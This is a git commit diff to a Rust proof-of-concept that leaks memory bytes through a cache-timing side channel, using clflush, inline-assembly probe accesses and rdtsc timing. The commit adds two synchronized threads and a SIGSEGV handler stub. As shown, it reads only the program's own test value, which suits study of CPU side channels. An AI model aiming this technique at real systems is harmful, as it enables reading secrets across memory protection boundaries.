170f7a6a52a09d391c272a0057a3cdea8da7f41c
Simon THOBY <git@nightmared.fr>
2021-02-21 15:01:33 +0100

    a bit of multithreading for the fun of it

--- src/main.rs
+++ src/main.rs
@@ -1,37 +1,33 @@
 #![feature(asm)]
 
-use rand::seq::SliceRandom;
+use std::sync::atomic::{AtomicUsize, Ordering};
+use std::thread;
 
 const MULTIPLE_OFFSET: usize = 4096;
-const NB_TRIES: usize = 17;
+const CACHE_LINE_SIZE: usize = 64;
+const NB_TRIES: usize = 1;
 
 static TO_LEAK: usize = 0x0123456789abcdef;
-static mut TEST_ARR: [u8; 256 * MULTIPLE_OFFSET + 64] = [127; 256 * MULTIPLE_OFFSET + 64];
+static mut TEST_ARR: [u8; 256 * MULTIPLE_OFFSET + CACHE_LINE_SIZE] =
+    [127; 256 * MULTIPLE_OFFSET + CACHE_LINE_SIZE];
 static mut HISTOGRAM: [[u64; NB_TRIES]; 256] = [[0; NB_TRIES]; 256];
 
-unsafe fn measure_addr(target_adress: *const u8) -> u8 {
-    let mut base_addr = TEST_ARR.as_ptr() as usize;
-    // align on a cache line size
-    base_addr = (base_addr + 64) & 0xffffffffffffffc0;
-    let mut rng = rand::thread_rng();
-    let mut v = (0..256).collect::<Vec<usize>>();
+static mut BASE_ADDR: usize = 0;
 
+extern "C" fn handle_sigsegv(_: libc::c_int) {}
+
+const STARTING: usize = 0;
+const READY: usize = 1;
+const ACCESSED: usize = 2;
+
+static mut SYNC_POINT: AtomicUsize = AtomicUsize::new(STARTING);
+
+#[inline]
+unsafe fn measure_byte() -> u8 {
+    // generally works better with NB_TRIES = 1, but quite simple to implement this support
     for j in 0..NB_TRIES {
-        v.shuffle(&mut rng);
-
-        // prefetch an entry for ensuring TLB won't impact the measures
-        std::ptr::read_volatile(base_addr as *const u8);
-
-        // flush
-        for i in 0..((256 * MULTIPLE_OFFSET) / 64) {
-            core::arch::x86_64::_mm_clflush((base_addr as usize + i * 64) as *const u8 as *mut u8);
-        }
-
-        // perform the access
-        asm!("movzx rax, byte ptr [{0}]", "imul rax, {2}", "add {1}, rax", "movzx rax, byte ptr [{1}]", in(reg) target_adress, inout(reg) base_addr => _, in(reg) MULTIPLE_OFFSET, out("rax") _);
-
         for i in 0..256 {
-            let count_addr = base_addr as usize + i * MULTIPLE_OFFSET;
+            let count_addr = BASE_ADDR as usize + i * MULTIPLE_OFFSET;
             let delta_tsc;
             // measure the time
             asm!("mfence", "lfence", "rdtsc", "lfence", "shl rdx, $32", "or rax, rdx", "mov rcx, rax",
@@ -51,6 +47,7 @@ unsafe fn measure_addr(target_adress: *const u8) -> u8 {
         .iter()
         .map(|x| x[NB_TRIES / 2])
         .collect::<Vec<u64>>();
+    //println!("{:?}", HISTOGRAM);
     //println!("{:?}", medians);
 
     let (idx, _) = medians
@@ -62,17 +59,70 @@ unsafe fn measure_addr(target_adress: *const u8) -> u8 {
     idx as u8
 }
 
-unsafe fn read_ptr(target_adress: *const u8) -> usize {
-    let mut res: usize = 0;
-    for i in 0..8 {
-        res |= (measure_addr((target_adress as usize + i) as *const u8) as usize) << (i * 8);
+unsafe fn thread_leak_data(nb_bytes: usize) -> Vec<u8> {
+    let mut res = Vec::with_capacity(nb_bytes);
+
+    for _ in 0..nb_bytes {
+        while SYNC_POINT.load(Ordering::Acquire) != STARTING {}
+
+        // prefetch an entry for ensuring TLB won't impact the measures
+        std::ptr::read_volatile(BASE_ADDR as *const u8);
+
+        // flush
+        for i in 0..((256 * MULTIPLE_OFFSET) / CACHE_LINE_SIZE) {
+            core::arch::x86_64::_mm_clflush(
+                (BASE_ADDR as usize + i * CACHE_LINE_SIZE) as *const u8 as *mut u8,
+            );
+        }
+
+        SYNC_POINT.store(READY, Ordering::Release);
+
+        while SYNC_POINT.load(Ordering::Acquire) != ACCESSED {}
+
+        res.push(measure_byte());
+
+        SYNC_POINT.store(STARTING, Ordering::Release);
     }
 
     res
 }
 
+unsafe fn thread_perform_access(target_adress: *const u8, nb_bytes: usize) {
+    for i in 0..nb_bytes {
+        while SYNC_POINT.load(Ordering::Acquire) != READY {}
+
+        let target_adress = target_adress as usize + i;
+
+        asm!("movzx rax, byte ptr [{0}]", "imul rax, {2}", "add {1}, rax", "movzx rax, byte ptr [{1}]", in(reg) target_adress, inout(reg) BASE_ADDR => _, in(reg) MULTIPLE_OFFSET, out("rax") _);
+
+        SYNC_POINT.store(ACCESSED, Ordering::Release);
+    }
+}
+
+fn measure_bytes_with_threads(target_adress: usize, nb_bytes: usize) -> Vec<u8> {
+    let leaker = thread::spawn(move || unsafe { thread_leak_data(nb_bytes) });
+
+    thread::spawn(move || unsafe { thread_perform_access(target_adress as *const u8, nb_bytes) })
+        .join()
+        .unwrap();
+
+    leaker.join().unwrap()
+}
+
+fn read_ptr(target_adress: usize) -> usize {
+    let vec = measure_bytes_with_threads(target_adress, 8);
+    vec.iter()
+        .enumerate()
+        .fold(0, |acc, (pos, e)| acc | ((*e as usize) << (pos * 8)))
+}
+
 fn main() {
-    println!("0x{:x}", unsafe {
-        read_ptr(&TO_LEAK as *const usize as *const u8)
-    });
+    // setup
+    unsafe {
+        let base_addr = TEST_ARR.as_ptr() as usize;
+        // align on a cache line size
+        BASE_ADDR = (base_addr + CACHE_LINE_SIZE) & (0xffffffffffffffff - CACHE_LINE_SIZE + 1);
+    }
+
+    println!("0x{:x}", read_ptr(&TO_LEAK as *const usize as usize));
 }
